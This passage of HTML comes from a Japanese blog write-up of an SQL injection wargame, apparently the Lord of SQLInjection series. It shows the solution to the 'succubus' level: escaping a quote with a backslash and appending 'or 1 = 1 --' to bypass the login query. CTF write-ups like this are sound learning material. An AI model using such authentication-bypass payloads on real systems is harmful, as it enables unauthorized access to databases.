  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h3 id="考察-17"><a href="#考察-17" class="header-anchor">#</a> 考察</h3> <p>一個上の問題のereg関数がpreg_match関数に変わってますね．
NULLバイトアタックを使ってもできないので他を考えました．</p> <h3 id="回答-17"><a href="#回答-17" class="header-anchor">#</a> 回答</h3> <p>バックスラッシュでシングルクォーテーションをエスケープします．
ハイライトを見るとわかりやすいです．</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> id <span class="token keyword">from</span> prob_succubus <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'\' and pw='</span> <span class="token operator">or</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment">-- '</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div></div></article> <section class="post-meta main-div" data-v-4e23451f><section class="post-date clearfix" data-v-4e23451f><span class="create-date" data-v-4e23451f>
      Created : 2020-05-03
    </span> <span class="update-date" data-v-4e23451f>
      Updated : 2020-05-03
    </span></section> <section class="post-links" data-v-4e23451f><a href="/blog/posts/2020/05/03/_20200503-1.html" class="post-link" data-v-4e23451f>
      Previous Post : runc build
    </a> <!----></section></section> <div id="post-comments" class="main-div"><!----></div></div></main> <aside class="aside" data-v-4dd605a1><div class="info-card main-div" data-v-9d847660 data-v-4dd605a1><div class="info-card-header" style="background-size:cover;background-repeat:no-repeat;background-position:center;background-attachment:scroll;background-image:url(/blog/img/bg.jpg);" data-v-9d847660><img src="/blog/img/avatar.jpg" alt="wt" class="info-avatar" data-v-9d847660></div> <div class="info-card-body" data-v-9d847660><section class="info-nickname" data-v-9d847660>
      wt
    </section> <section class="info-desc" data-v-9d847660>go go go</section> <section class="info-contact" data-v-9d847660><section data-v-9d847660><span title="Nagoya in Japan" data-v-9d847660 data-v-9d847660><svg class="icon" style="font-size:1em;" data-v-9d847660 data-v-9d847660><title data-v-9d847660 data-v-9d847660>Nagoya in Japan</title><use xlink:href="#icon-location" data-v-9d847660 data-v-9d847660></use></svg><span class="info-text" data-v-9d847660 data-v-9d847660>
          Nagoya in Japan
        </span></span></section> <section data-v-9d847660><span title="Nagoya University" data-v-9d847660 data-v-9d847660><svg class="icon" style="font-size:1em;" data-v-9d847660 data-v-9d847660><title data-v-9d847660 data-v-9d847660>Nagoya University</title><use xlink:href="#icon-organization" data-v-9d847660 data-v-9d847660></use></svg><span class="info-text" data-v-9d847660 data-v-9d847660>
          Nagoya University
        </span></span></section> <section data-v-9d847660><a href="mailto:ei13suke@gmail.com" title="ei13suke@gmail.com" data-v-9d847660 data-v-9d847660><svg class="icon" style="font-size:1em;" data-v-9d847660 data-v-9d847660><title data-v-9d847660 data-v-9d847660>ei13suke@gmail.com</title><use xlink:href="#icon-email" data-v-9d847660 data-v-9d847660></use></svg><span class="info-text" data-v-9d847660 data-v-9d847660>
          ei13suke@gmail.com
        </span></a></section></section></div> <div class="info-card-footer" data-v-9d847660><section class="info-sns clearfix" data-v-9d847660><a href="https://github.com/wt-l00" target="_blank" class="sns-link" data-v-9d847660><span title="GitHub: wt-l00" class="sns-icon" data-v-9d847660 data-v-9d847660><svg class="icon" style="font-size:1.5em;" data-v-9d847660 data-v-9d847660><title data-v-9d847660 data-v-9d847660>GitHub: wt-l00</title><use xlink:href="#icon-github" data-v-9d847660 data-v-9d847660></use></svg></span></a></section></div></div> <div class="post-nav-card main-div" style="position:relative;top:0;width:0px;" data-v-4dd605a1><div class="post-nav-contents"><svg class="icon"><title>book</title><use xlink:href="#icon-book"></use></svg> <span>Table of Contents</span> <div class="post-nav-toc"><ul><li><a href="/blog/posts/2020/05/03/_20200503-2.html#gremlin">gremlin</a><ul><li><a href="/blog/posts/2020/05/03/_20200503-2.html#問題">問題</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#考察">考察</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#回答">回答</a></li></ul></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#cobolt">cobolt</a><ul><li><a href="/blog/posts/2020/05/03/_20200503-2.html#問題-2">問題</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#考察-2">考察</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#回答-2">回答</a></li></ul></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#goblin">goblin</a><ul><li><a href="/blog/posts/2020/05/03/_20200503-2.html#問題-3">問題</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#考察-3">考察</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#回答-3">回答</a></li></ul></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#orc">orc</a><ul><li><a href="/blog/posts/2020/05/03/_20200503-2.html#問題-4">問題</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#考察-4">考察</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#回答-4">回答</a></li></ul></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#wolfman">wolfman</a><ul><li><a href="/blog/posts/2020/05/03/_20200503-2.html#問題-5">問題</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#考察-5">考察</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#回答-5">回答</a></li></ul></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#darkelf">darkelf</a><ul><li><a href="/blog/posts/2020/05/03/_20200503-2.html#問題-6">問題</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#考察-6">考察</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#回答-6">回答</a></li></ul></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#orge">orge</a><ul><li><a href="/blog/posts/2020/05/03/_20200503-2.html#問題-7">問題</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#考察-7">考察</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#回答-7">回答</a></li></ul></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#troll">troll</a><ul><li><a href="/blog/posts/2020/05/03/_20200503-2.html#問題-8">問題</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#考察-8">考察</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#回答-8">回答</a></li></ul></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#vampire">vampire</a><ul><li><a href="/blog/posts/2020/05/03/_20200503-2.html#問題-9">問題</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#考察-9">考察</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#回答-9">回答</a></li></ul></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#skeleton">skeleton</a><ul><li><a href="/blog/posts/2020/05/03/_20200503-2.html#問題-10">問題</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#考察-10">考察</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#回答-10">回答</a></li></ul></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#golem">golem</a><ul><li><a href="/blog/posts/2020/05/03/_20200503-2.html#問題-11">問題</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#考察-11">考察</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#回答-11">回答</a></li></ul></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#darkknight">darkknight</a><ul><li><a href="/blog/posts/2020/05/03/_20200503-2.html#問題-12">問題</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#考察-12">考察</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#回答-12">回答</a></li></ul></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#bugbear">bugbear</a><ul><li><a href="/blog/posts/2020/05/03/_20200503-2.html#問題-13">問題</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#考察-13">考察</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#回答-13">回答</a></li></ul></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#giant">giant</a><ul><li><a href="/blog/posts/2020/05/03/_20200503-2.html#問題-14">問題</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#考察-14">考察</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#回答-14">回答</a></li></ul></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#assassin">assassin</a><ul><li><a href="/blog/posts/2020/05/03/_20200503-2.html#問題-15">問題</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#考察-15">考察</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#回答-15">回答</a></li></ul></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#zombie-assassin">zombie_assassin</a><ul><li><a href="/blog/posts/2020/05/03/_20200503-2.html#問題-16">問題</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#考察-16">考察</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#回答-16">回答</a></li></ul></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#succubus">succubus</a><ul><li><a href="/blog/posts/2020/05/03/_20200503-2.html#問題-17">問題</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#考察-17">考察</a></li><li><a href="/blog/posts/2020/05/03/_20200503-2.html#回答-17">回答</a></li></ul></li></ul></div></div> <div class="post-nav-comments"><svg class="icon"><title>comment</title><use xlink:href="#icon-comment"></use></svg> <a href="/blog/posts/2020/05/03/_20200503-2.html#post-comments">
      Comments
    </a></div></div></aside></div> <footer class="footer" data-v-1375e54c><p class="footer-sns-links" data-v-1375e54c><a href="https://github.com/wt-l00" target="_blank" class="sns-link" data-v-1375e54c><span title="GitHub: wt-l00" class="sns-icon" data-v-1375e54c data-v-1375e54c><svg class="icon" style="font-size:25px;" data-v-1375e54c data-v-1375e54c><title data-v-1375e54c data-v-1375e54c>GitHub: wt-l00</title><use xlink:href="#icon-github" data-v-1375e54c data-v-1375e54c></use></svg></span></a></p> <p class="footer-text" data-v-1375e54c><span data-v-1375e54c>Powered by </span> <a href="https://github.com/vuejs/vuepress" target="_blank" data-v-1375e54c>
      VuePress
    </a> <span data-v-1375e54c> | </span> <a href="https://github.com/meteorlxy/vuepress-theme-meteorlxy" target="_blank" data-v-1375e54c>
        meteorlxy
      </a></p> <p class="footer-text" data-v-1375e54c>Copyright 2018-present <a href="https://github.com/meteorlxy" target="_blank">meteorlxy</a> | MIT License</p></footer></div><div class="global-ui"><!----><!----></div></div>
    <script src="/blog/assets/js/app.61f8cf39.js" defer></script><script src="/blog/assets/js/7.cad17870.js" defer></script><script src="/blog/assets/js/17.fe1b2920.js" defer></script>
  </body>
</html>
